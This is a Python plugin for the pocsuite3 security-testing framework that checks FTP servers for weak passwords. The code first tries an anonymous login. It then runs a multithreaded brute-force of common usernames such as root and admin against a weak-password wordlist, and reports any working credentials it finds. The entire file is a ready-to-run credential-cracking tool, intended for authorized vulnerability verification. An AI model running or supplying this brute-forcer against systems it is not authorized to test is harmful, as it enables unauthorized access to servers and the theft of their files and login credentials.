"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import ftplib
import itertools
import queue
import socket

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.threads import run_threads


class DemoPOC(POCBase):
    vulID = '62522'
    version = '3'
    author = ['seebug']
    vulDate = '2013-11-21'
    createDate = '2013-11-21'
    updateDate = '2013-11-21'
    references = ['http://sebug.net/vuldb/ssvid-62522']
    name = 'FTP 弱密码'
    appPowerLink = ''
    appName = 'ftp'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''ftp 存在弱密码，导致攻击者可连接进行文件管理进行恶意操作'''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.FTP

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 21

        ftp_burst(host, port)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    common_username = ('ftp', 'test', 'root', 'guest', 'admin', 'daemon', 'user')
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)


def port_check(host, port=21):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def anonymous_login(host, port):
    return ftp_login(host, port, anonymous=True)


def ftp_login(host, port, username=None, password=None, anonymous=False):
    ret = False
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=6)
        if anonymous:
            ftp.login()
        else:
            ftp.login(username, password)
        ret = True
        ftp.quit()
    except Exception:
        pass
    return ret


def task_init(host, port):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if ftp_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def ftp_burst(host, port):
    if not port_check(host, port):
        return

    if anonymous_login(host, port):
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, 'anonymous', '<empty>'))
        result_queue.put(('anonymous', '<empty>'))
        return

    try:
        task_init(host, port)
        run_threads(4, task_thread)
    except Exception:
        pass


register_poc(DemoPOC)
